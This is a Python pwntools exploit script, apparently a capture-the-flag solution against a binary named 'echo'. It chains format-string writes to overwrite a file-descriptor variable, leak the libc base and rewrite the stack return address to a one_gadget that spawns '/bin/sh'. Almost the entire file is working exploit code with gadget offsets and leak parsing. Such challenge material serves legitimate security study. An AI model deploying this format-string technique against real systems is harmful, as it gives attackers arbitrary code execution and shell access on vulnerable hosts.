#rdi, rsi, rdx, rcx, r8, r9
# no CANARY, yes NX, no pie, full RELRO	

'''
one gadget

0x4f2c5	execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322	execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

(nil) 0x65 (nil) (nil) 0x7fffffffdbb0
0x4007af 0x7fffffffdbc0 0x4007e8 0x400830 0x7ffff7a2d830
0x1 0x7fffffffdca8 0x1f7ffcca0 0x4007d0 (nil)

rip+0x2008a3
'''

from pwn import *
from termcolor import colored

def fmt( p ):
	r.send(p+'\n')
	raw_input('waiting~~')
	# sleep(0.5)

def get(i,n):
	ret = (i>>16*(n-1))&0xffff
	print("get:" ,hex(i) , 'ret' , hex(ret))
	return ret

# overwrite bad_fd
bad_fd = 0x601010
r = process('./echo')
# r = remote('csie.ctf.tw',10132)
fmt('%{}c%7$n'.format(bad_fd ))
fmt( 'Q%9$hhn'.format( 1 ) )
raw_input()
# r.recv()
# raw_input()
fmt( '|%10$p||' )
# print('send.')
# print('recv:',r.recv())

libc_base = int(r.recvuntil('||').split('|')[-3],16) - 0x21b97
print(colored('libc_base  : %x' % libc_base,'red')) 
one_gadget = libc_base + 0x4f2c5 

fmt('|%7$p||')
b = int(r.recvuntil('||').split('|')[-3],16) 
ret_addr = b - 8
b = (b)& 0xff
print(colored('stack_base_7: %x' % b,'red')) 
print(colored('target_ret  : %x' % ret_addr,'red')) 


fmt( '%{}c%5$hhn'.format( b ) )
fmt( '%{}c%7$hnZZ1'.format( get( ret_addr, 1 ) ) )
r.recvuntil('ZZ1')

fmt( '%{}c%5$hhn'.format( b+2 ) )
fmt( '%{}c%7$hnZZ2'.format( get( ret_addr, 2 ) ) )
r.recvuntil('ZZ2')

fmt( '%{}c%5$hhn'.format( b+4 ) )
fmt( '%{}c%7$hnZZ3'.format( get( ret_addr, 3 ) ) )
r.recvuntil('ZZ3')
# print('finish!')
# r.send('exit\n')
# print(colored('one_gadget : %x' % one_gadget,'red'))
fmt( '%{}c%5$hhn'.format( b + 16) )
fmt( '%{}c%9$hnZZ4'.format( get( ret_addr +1 , 1 ) ) )
r.recvuntil('ZZ4')
print('recv ZZ4')

fmt( '%{}c%7$hhn'.format( (ret_addr & 0xff) + 2 ) )
fmt( '%{}c%9$hnZZ5'.format( get( ret_addr +1 , 2 ) ) )
r.recvuntil('ZZ5')
print('recv ZZ5')


fmt( '%{}c%7$hn'.format( get( ret_addr+2, 1 ) ) )
fmt( '%{}c%9$hnZZ5'.format( get( one_gadget, 2 ) ) )
r.recvuntil('ZZ5')

fmt( '%{}c%5$hhn'.format( b+6 ) )
fmt( '%{}c%7$hnZZ4'.format( get( ret_addr, 4 ) ) )
r.recvuntil('ZZ4')

raw_input("rewrite!")

fmt( '%{}c%7$hhn'.format( b+16 ) )
fmt( '%{}c%9$hnZZ5'.format( get( ret_addr + 4, 1 ) ) )
r.recvuntil('ZZ5')

fmt( '%{}c%7$hhn'.format( b+16+2 ) )
fmt( '%{}c%9$hnZZ6'.format( get( ret_addr + 4, 2 ) ) )
r.recvuntil('ZZ6')

fmt( '%{}c%7$hhn'.format( b+16+4 ) )
fmt( '%{}c%9$hnZZ7'.format( get( ret_addr + 4, 3 ) ) )
r.recvuntil('ZZ7')

fmt( '%{}c%5$hhn'.format( b+8+6 ) )
fmt( '%{}c%7$hnZZ8'.format( get( ret_addr + 1, 4 ) ) )
r.recvuntil('ZZ8')

# print(colored('one_gadget : %x' % one_gadget,'red'))
# a = one_gadget & 0xffff
# b = (one_gadget & 0xffff0000) >> 16
# fmt( '%{}c%9$hhn%{}c%11$hnZZ8'.format(a,b-a) )
# r.recvuntil('ZZ8')
# sleep(1)
while True:
	r.send(raw_input())
# r.send('sh')
# r.interactive()

